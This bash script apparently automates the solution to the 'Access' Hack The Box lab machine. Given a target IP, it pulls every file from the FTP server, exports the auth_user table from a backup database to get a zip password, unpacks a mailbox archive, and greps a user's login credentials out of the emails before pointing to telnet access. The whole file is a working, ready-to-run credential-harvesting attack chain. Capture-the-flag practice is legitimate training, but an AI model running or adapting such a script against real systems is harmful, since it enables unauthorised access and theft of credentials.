#!/bin/bash
# Clone it locally: `wget https://raw.githubusercontent.com/spread0942/htb_walkthrough/refs/heads/main/machines/access/access.sh`
# Change the permission `chmod 755 access.sh`
# Run it: `./access.sh`

if [ "$#" -ne 1 ]
then
  echo "[-] Incorrect number of arguments."
  echo "[-] $0 <IP>"
  exit 1
fi

ip=$1

echo [+] Installing dependecies...
apt install -y mdbtools pst-utils

echo
echo [+] Downloading all the files from the FTP server
wget -r ftp://$ip --no-passive-ftp

echo
echo [+] Dumping tables and checking the auth_user
mdb-tables $ip/Backups/backup.mdb | sed 's/ /\n/g' | grep auth_user

echo
echo [+] Extracting the zip password
mdb-export $ip/Backups/backup.mdb auth_user > auth_user.csv && cat auth_user.csv | grep engineer | awk 'BEGIN{FS=","} {print $3}' | sed 's/"//g' > zip_password

echo
echo [+] Extracting the pst file
7z x "$ip/Engineer/Access Control.zip" -p"$(cat zip_password)"

echo
echo [+] Converting in .pst file in .mbox...
readpst "Access Control.pst"

echo [+] Retrieving the user credential...
echo
cat "Access Control.mbox" | grep "The password" | head -1 | awk '{print $5,$11}' | sed 's/”//g; s/“//g; s/.$//'

echo
echo [+] You can log in using telnet.
